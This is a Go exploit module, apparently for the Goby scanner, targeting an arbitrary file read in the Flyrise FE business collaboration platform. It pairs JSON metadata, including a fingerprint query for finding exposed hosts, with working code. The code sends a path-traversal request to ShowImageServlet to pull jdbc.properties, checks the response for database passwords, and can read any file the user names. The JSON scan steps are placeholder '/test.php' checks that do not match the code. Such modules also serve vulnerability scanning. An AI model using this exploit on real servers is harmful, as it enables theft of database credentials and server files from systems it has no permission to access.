package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "FlyEnterprise Internet FE Business Collaboration Platform ShowImageServlet Arbitrary File Read Vulnerability",
    "Description": "<p>FE office collaboration platform is an information management platform for application development, operation, management and maintenance.</p><p>There is a file reading vulnerability in the Feiqi Internet FE business collaboration platform, through which attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "Flyrise-FE-Ent-Operation-MP",
    "Homepage": "https://www.flyrise.cn/",
    "DisclosureDate": "2023-02-25",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"src=\\\"/js39/flyrise.dialog.js\" || body=\"src=\\\"/js39/external/jquery\"",
    "GobyQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"src=\\\"/js39/flyrise.dialog.js\" || body=\"src=\\\"/js39/external/jquery\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.flyrise.cn/\">https://www.flyrise.cn/</a></p>",
    "References": [
        "https://www.flyrise.cn/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "../web/fe.war/WEB-INF/classes/jdbc.properties",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.3",
    "Translation": {
        "CN": {
            "Name": "飞企互联 FE 业务协作平台 ShowImageServlet 文件 magePath 参数文件读取漏洞",
            "Product": "飞企互联-FE企业运营管理平台",
            "Description": "<p>FE 办公协作平台是实现应用开发、运行、管理、维护的信息管理平台。</p><p>飞企互联 FE 业务协作平台存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：</p><p><a href=\"https://www.flyrise.cn/\">https://www.flyrise.cn/</a><br></p>",
            "Impact": "<p>飞企互联 FE 业务协作平台存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "FlyEnterprise Internet FE Business Collaboration Platform ShowImageServlet Arbitrary File Read Vulnerability",
            "Product": "Flyrise-FE-Ent-Operation-MP",
            "Description": "<p>FE office collaboration platform is an information management platform for application development, operation, management and maintenance.</p><p>There is a file reading vulnerability in the Feiqi Internet FE business collaboration platform, through which attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.flyrise.cn/\">https://www.flyrise.cn/</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-08",
    "PocId": "10818"
}`

	sendPayload8SD8v := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/servlet/ShowImageServlet?imagePath=" + filename + "&print")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayload8SD8v(u, "../web/fe.war/WEB-INF/classes/jdbc.properties")
			if err != nil || rsp.StatusCode != 200 {
				return false
			}
			return strings.Contains(rsp.Utf8Html, "jdbc.driver") && strings.Contains(rsp.Utf8Html, "jdbc.url") && strings.Contains(rsp.Utf8Html,"jdbc.password")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := goutils.B2S(ss.Params["filename"])
			rsp, err := sendPayload8SD8v(expResult.HostInfo, filename)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				if strings.HasPrefix(rsp.Utf8Html, "??????!") || strings.HasPrefix(rsp.Utf8Html, "无法打开图片!") {
					expResult.Success = false
					expResult.Output = "目标文件不存在"
				} else {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				}
			}
			return expResult
		},
	))
}

